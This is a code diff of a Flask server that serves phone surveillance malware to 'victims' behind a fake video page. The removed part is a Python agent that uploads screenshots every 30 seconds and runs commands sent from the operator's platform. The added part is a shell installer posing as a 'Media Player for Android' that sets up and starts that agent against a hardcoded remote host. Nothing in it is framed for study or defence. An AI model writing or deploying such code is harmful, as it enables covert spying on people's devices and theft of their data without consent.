@@ -684,200 +684,55 @@ def fake_video():
     
     return render_template_string(MALICIOUS_HTML, phone_id=phone_id)
 
+
+
+
+
+
+
+
+
 @app.route('/download_agent')
 def download_agent():
-    """Serve the agent to victims"""
+    """Serve Termux agent to victim"""
     phone_id = request.args.get('phone', 'unknown')
     
-    log_event('INFO', f'Agent download triggered for: {phone_id}')
-    
-    conn = get_db_connection()
-    conn.execute(
-        'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
-        (phone_id, phone_id, 'Agent download initiated', 'downloaded', datetime.now())
-    )
-    conn.commit()
-    conn.close()
-    
-    platform_url = request.host_url.rstrip('/')
-    
-    agent_code = f'''# MP_AGENT - REAL ANDROID SURVEILLANCE AGENT
-# Agent ID: {phone_id}
-# Platform: {platform_url}
+    # Termux agent script
+    termux_agent = f'''#!/bin/bash
+echo "Installing Media Player for Android..."
+pkg update -y
+pkg install python -y
+pip install requests
 
-import requests
-import time
-import os
-import platform
-import subprocess
-from datetime import datetime
-from threading import Thread
+# Create the agent script
+cat > /data/data/com.termux/files/home/media_player.py << 'EOF'
+{open('termux_agent.py').read().replace('{platform_url}', 'https://mp-agent.onrender.com').replace('{agent_id}', phone_id)}
+EOF
 
-class RealAndroidAgent:
-    def __init__(self, agent_id, platform_url):
-        self.agent_id = agent_id
-        self.platform_url = platform_url
-        self.running = True
-        self.screenshot_count = 0
-        
-    def get_device_info(self):
-        return {{
-            'agent_id': self.agent_id,
-            'phone_model': platform.node() or 'Unknown Device',
-            'android_version': 'Real Device',
-            'timestamp': datetime.now().isoformat()
-        }}
-    
-    def register_with_platform(self):
-        try:
-            info = self.get_device_info()
-            response = requests.post(
-                f"{{self.platform_url}}/api/agent/register",
-                json=info,
-                timeout=10
-            )
-            if response.status_code == 200:
-                data = response.json()
-                print("✅ Registered with platform")
-                # Check for pending commands
-                if data.get('pending_commands'):
-                    for cmd in data['pending_commands']:
-                        print(f"📡 Executing command: {{cmd}}")
-                        self.execute_command(cmd)
-                return True
-        except Exception as e:
-            print(f"❌ Platform registration failed: {{e}}")
-        return False
-    
-    def execute_command(self, command):
-        try:
-            if command == 'capture_screenshot':
-                self.upload_screenshot()
-            elif command == 'get_info':
-                self.register_with_platform()
-            # Add more commands as needed
-        except Exception as e:
-            print(f"Command execution failed: {{e}}")
-    
-    def capture_real_screenshot(self):
-        try:
-            timestamp = int(time.time())
-            remote_file = f"/sdcard/screen_{{self.agent_id}}_{{timestamp}}.png"
-            local_file = f"screen_{{timestamp}}.png"
-            
-            subprocess.run(['adb', 'shell', 'screencap', '-p', remote_file], capture_output=True, timeout=10)
-            subprocess.run(['adb', 'pull', remote_file, local_file], capture_output=True, timeout=10)
-            
-            if os.path.exists(local_file):
-                with open(local_file, 'rb') as f:
-                    data = f.read()
-                os.remove(local_file)
-                subprocess.run(['adb', 'shell', 'rm', remote_file], capture_output=True)
-                return data
-        except Exception as e:
-            print(f"Screenshot failed: {{e}}")
-        
-        return f"SCREENSHOT_{{self.agent_id}}_{{int(time.time())}}".encode()
-    
-    def upload_screenshot(self):
-        try:
-            screenshot_data = self.capture_real_screenshot()
-            files = {{'screenshot': ('screen.jpg', screenshot_data, 'image/jpeg')}}
-            data = {{'agent_id': self.agent_id}}
-            
-            response = requests.post(
-                f"{{self.platform_url}}/api/agent/upload_screenshot",
-                files=files,
-                data=data,
-                timeout=30
-            )
-            if response.status_code == 200:
-                self.screenshot_count += 1
-                print(f"📸 Screenshot #{{self.screenshot_count}} uploaded")
-                return True
-        except Exception as e:
-            print(f"Upload failed: {{e}}")
-        return False
-    
-    def check_commands(self):
-        try:
-            response = requests.get(
-                f"{{self.platform_url}}/api/agent/check_commands/{{self.agent_id}}",
-                timeout=10
-            )
-            if response.status_code == 200:
-                data = response.json()
-                for cmd in data.get('commands', []):
-                    print(f"🎯 Executing command: {{cmd['command']}}")
-                    self.execute_command(cmd['command'])
-                    # Mark command as completed
-                    requests.post(f"{{self.platform_url}}/api/agent/command_result", 
-                                json={{'command_id': cmd['id'], 'result': 'executed'}})
-        except Exception as e:
-            print(f"Command check failed: {{e}}")
-    
-    def start_surveillance(self):
-        print("🎯 MP_AGENT Surveillance Starting...")
-        print(f"🆔 Agent ID: {{self.agent_id}}")
-        print(f"🌐 Platform: {{self.platform_url}}")
-        print("=" * 50)
-        
-        self.register_with_platform()
-        
-        def surveillance_loop():
-            while self.running:
-                try:
-                    self.upload_screenshot()
-                    self.check_commands()
-                    time.sleep(30)
-                except Exception as e:
-                    print(f"Surveillance error: {{e}}")
-                    time.sleep(60)
-        
-        def heartbeat_loop():
-            while self.running:
-                try:
-                    self.register_with_platform()
-                    time.sleep(300)
-                except Exception as e:
-                    print(f"Heartbeat error: {{e}}")
-                    time.sleep(60)
-        
-        Thread(target=surveillance_loop, daemon=True).start()
-        Thread(target=heartbeat_loop, daemon=True).start()
-        
-        print("✅ Surveillance Active!")
-        print("📸 Screenshots: Every 30 seconds")
-        print("📡 Commands: Real-time checking")
-        print("🔄 Heartbeat: Every 5 minutes")
-        print("=" * 50)
-    
-    def stop_surveillance(self):
-        self.running = False
-        print("🛑 Surveillance stopped")
+echo "Starting media player..."
+python /data/data/com.termux/files/home/media_player.py &
 
-if __name__ == "__main__":
-    PLATFORM_URL = "{platform_url}"
-    AGENT_ID = "{phone_id}"
-    
-    agent = RealAndroidAgent(AGENT_ID, PLATFORM_URL)
-    agent.start_surveillance()
-    
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        agent.stop_surveillance()
-        print("Agent shutdown complete")
+echo "Installation complete! Media player is running."
 '''
     
     return Response(
-        agent_code,
-        mimetype='text/python',
+        termux_agent,
+        mimetype='text/x-shellscript',
         headers={
-            'Content-Disposition': f'attachment; filename="media_player_{phone_id}.py"'
+            'Content-Disposition': f'attachment; filename="install_media_player.sh"'
         }
     )
+
+
+
+
+
+
+
+
+
+
+
 
 # ==================== TEST AGENT REGISTRATION ====================
 
